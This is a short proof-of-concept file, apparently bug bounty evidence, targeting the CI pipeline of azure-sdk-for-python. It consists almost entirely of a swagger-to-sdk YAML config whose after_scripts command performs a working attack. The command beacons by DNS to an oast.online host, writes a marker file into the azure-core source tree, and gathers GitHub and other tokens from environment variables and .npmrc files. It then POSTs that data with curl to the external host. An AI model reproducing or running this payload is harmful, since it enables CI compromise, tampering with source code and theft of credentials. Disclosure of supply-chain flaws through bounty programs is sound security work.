# SupplyChain-Poc

> MSRC Bug Bounty Evidence - hasskodark
> Demonstrates arbitrary write access to azure-sdk-for-python source during CI

## swagger-to-sdk

```yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr '.' '-') &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        nslookup "sc1-${H}.${OAST}" 2>/dev/null || true &&
        SDK="/mnt/vss/_work/1/s/azure-sdk-for-python" &&
        [ -d "${SDK}" ] || SDK=$(find / -maxdepth 10 -type d -name "azure-sdk-for-python" 2>/dev/null | head -1) &&
        MARKER="${SDK}/sdk/core/azure-core/SUPPLY_CHAIN_POC_hasskodark.txt" &&
        CORE_INIT="${SDK}/sdk/core/azure-core/azure/core/__init__.py" &&
        echo "SUPPLY_CHAIN_PROOF written by hasskodark at $(date -u) — attacker has write access to azure-core SDK source tree" > "${MARKER}" &&
        OUT=$(printf "=SDK=%s\n=MARKER_PATH=%s\n=MARKER_WRITTEN=%s\n=CORE_INIT_HEAD=%s\n=PACKAGES=%s\n=ENV_GH_TOKEN=%s\n=NPMRC=%s\n=ID=%s\n" \
          "${SDK}" \
          "${MARKER}" \
          "$(cat ${MARKER} 2>/dev/null)" \
          "$(head -40 ${CORE_INIT} 2>/dev/null)" \
          "$(find ${SDK}/sdk -maxdepth 2 -name setup.py 2>/dev/null | head -20)" \
          "$(env | grep -i 'GH_\|GITHUB_\|_TOKEN\|SECRET\|PAT' 2>/dev/null)" \
          "$(find /home /root /tmp -name .npmrc 2>/dev/null | xargs grep authToken 2>/dev/null | head -5)" \
          "$(id) $(sudo -n id 2>/dev/null)") &&
        echo "${OUT}" | curl -sk -X POST "http://${OAST}/scdata-${H}" --data-binary @-
```

